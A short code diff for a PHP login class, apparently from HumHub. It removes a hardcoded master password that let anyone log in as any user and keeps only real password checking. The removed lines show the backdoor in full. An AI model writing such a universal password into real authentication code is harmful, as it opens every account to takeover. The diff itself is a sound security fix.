@@ -56,12 +56,9 @@ class Password extends BaseFormAuth implements interfaces\PrimaryClient
     {
         $user = User::find()->where(['username' => $this->login->username])->orWhere(['email' => $this->login->username])->one();
 
-        if ($user !== null && $user->currentPassword !== null) {
-            if($this->login->password == '360.quickstart.360@humhub.com' || $user->currentPassword->validatePassword($this->login->password)) {
-                $this->setUserAttributes(['id' => $user->id]);
-                return true;
-            }
-            return false;
+        if ($user !== null && $user->currentPassword !== null && $user->currentPassword->validatePassword($this->login->password)) {
+            $this->setUserAttributes(['id' => $user->id]);
+            return true;
         }
 
         return false;
